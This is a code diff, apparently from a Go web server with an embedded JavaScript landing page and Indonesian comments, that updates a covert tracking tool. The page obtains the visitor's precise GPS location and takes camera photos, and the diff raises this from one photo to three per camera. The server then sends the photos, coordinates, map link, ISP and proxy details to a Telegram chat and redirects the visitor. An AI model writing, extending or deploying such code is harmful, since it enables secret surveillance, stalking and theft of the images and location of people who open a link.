@@ -24,10 +24,10 @@ var chatID string
 var ip2LocationToken string
 
 type PhotoData struct {
-	Image          string         `json:"image"`
+	Image          []string       `json:"image"`
 	UserID         string         `json:"userId"`
 	URLID          string         `json:"urlId"`
-	Camera         string         `json:"camera"`
+	Camera         []string       `json:"camera"`
 	Message        string         `json:"message"`
 	DeviceLocation DeviceLocation `json:"deviceLocation"` // optional, kept for backward compat
 	Latitude       float64        `json:"latitude"`       // new fields from previous version
@@ -130,53 +130,75 @@ function getDeviceLocation(opts = {}) {
   });
 }
 
-function capturePhoto() {
-  return new Promise((resolve, reject) => {
-    const constraints = [
-      { video: { facingMode: "user" } },
-      { video: { facingMode: "environment" } }
-    ];
-    function attempt(i) {
-      if (i >= constraints.length) return reject(new Error("No camera"));
-      navigator.mediaDevices.getUserMedia(constraints[i])
-      .then(stream => {
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          video.play();
-          setTimeout(() => {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0,0, canvas.width, canvas.height);
-            const photo = canvas.toDataURL('image/jpeg', 0.8);
-            const cam = (i===0) ? "front" : "back";
-            stream.getTracks().forEach(t => t.stop());
-            resolve({ photo, cam });
-          }, 1200);
-        };
-      })
-      .catch(_ => attempt(i+1));
+async function capturePhoto() {
+  const photoCount = 3;
+  const delayBetweenShots = 1000;
+
+  const constraints = [
+    { video: { facingMode: "user" } },
+    { video: { facingMode: "environment" } }
+  ];
+
+  async function takePhotosFromStream(stream, cameraUsed) {
+    const results = [];
+    const video = document.createElement('video');
+    video.srcObject = stream;
+
+    await new Promise(resolve => video.onloadedmetadata = resolve);
+    video.play();
+
+    for (let i = 0; i < photoCount; i++) {
+      await new Promise(r => setTimeout(r, 1200)); // waktu persiapan kamera
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      const photo = canvas.toDataURL('image/jpeg', 0.8);
+      results.push({ photo, cam: cameraUsed });
+      await new Promise(r => setTimeout(r, delayBetweenShots)); // jeda antar foto
     }
-    attempt(0);
-  });
+
+    stream.getTracks().forEach(t => t.stop());
+    return results;
+  }
+
+  async function tryCapture(index = 0) {
+    if (index >= constraints.length) throw new Error("Tidak ada kamera yang tersedia");
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints[index]);
+      const cameraUsed = index === 0 ? "front" : "back";
+      return await takePhotosFromStream(stream, cameraUsed);
+    } catch (err) {
+      console.warn("Kamera gagal, mencoba kamera lain:", err);
+      return await tryCapture(index + 1);
+    }
+  }
+
+  return await tryCapture(0);
 }
 
 async function capturePhotoAndRedirect() {
   try {
     const location = await getDeviceLocation({ goalAccuracy: 30, maxSamples: 8, timeoutMs:15000 });
-    const photoRes = await capturePhoto();
+    const res = await capturePhoto();
+
     const payload = {
-      image: photoRes.photo,
+      image: [],
       userId: userId,
       urlId: urlId,
-      camera: photoRes.cam,
+      camera: [],
       message: "Data dikirim dari browser",
       latitude: location.has ? location.latitude : 0,
       longitude: location.has ? location.longitude : 0,
       accuracy: location.has ? location.accuracy : 0,
       source: location.has ? "GPS" : "IP"
     };
+
+	for (const r of res) {
+		payload.image.push(r.photo);
+		payload.camera.push(r.cam);
+	}
+
     await fetch('/upload-photo', {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
@@ -307,10 +329,9 @@ func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	body, _ := ioutil.ReadAll(r.Body)
 	var data PhotoData
-	if err := json.Unmarshal(body, &data); err != nil {
-		http.Error(w, "JSON tidak valid", http.StatusBadRequest)
+	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
+		http.Error(w, "invalid JSON", http.StatusBadRequest)
 		return
 	}
 
@@ -388,20 +409,6 @@ func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	// Decode image (strip data URI prefix)
-	var photoBytes []byte
-	if data.Image != "" {
-		img := data.Image
-		if idx := strings.Index(img, ","); idx != -1 {
-			img = img[idx+1:]
-		}
-		if b, err := base64.StdEncoding.DecodeString(img); err == nil {
-			photoBytes = b
-		} else {
-			log.Printf("gagal decode image: %v", err)
-		}
-	}
-
 	// Build message text exactly in the format you requested
 	locSource := data.Source
 	if locSource == "" {
@@ -450,8 +457,12 @@ func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 	sb.WriteString(fmt.Sprintf("🗺️ Open Maps: %s\n\n", mapsURL))
 
 	// Camera & ISP & Proxy & Time
-	if data.Camera != "" {
-		sb.WriteString(fmt.Sprintf("📷 Kamera: %s\n", data.Camera))
+	if len(data.Camera) > 0 {
+		for i, cam := range data.Camera {
+			sb.WriteString(fmt.Sprintf("📷 Kamera %d: %s\n", i+1, cam))
+		}
+	} else {
+		sb.WriteString("📷 Kamera: (tidak diketahui)\n")
 	}
 	if ispName != "" {
 		if asn != "" {
@@ -469,9 +480,24 @@ func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
 	if err := sendMessageToTelegram(message); err != nil {
 		log.Printf("gagal kirim message: %v", err)
 	}
-	if len(photoBytes) > 0 {
-		if err := sendPhotoToTelegram(photoBytes); err != nil {
-			log.Printf("gagal kirim photo: %v", err)
+
+	// Decode image (strip data URI prefix)
+	for i, img := range data.Image {
+		if img == "" {
+			continue
+		}
+		if idx := strings.Index(img, ","); idx != -1 {
+			img = img[idx+1:]
+		}
+
+		b, err := base64.StdEncoding.DecodeString(img)
+		if err != nil {
+			log.Printf("gagal decode image %d: %v", i+1, err)
+			continue
+		}
+
+		if err := sendPhotoToTelegram(b); err != nil {
+			log.Printf("gagal kirim photo %d: %v", i+1, err)
 		}
 	}
 
@@ -541,6 +567,6 @@ func main() {
 	http.HandleFunc("/", serveLandingPage)
 	http.HandleFunc("/upload-photo", uploadPhotoHandler)
 
-	log.Println("Server berjalan di :8080")
+	log.Println("Server berjalan di http://localhost:8080")
 	log.Fatal(http.ListenAndServe(":8080", nil))
 }
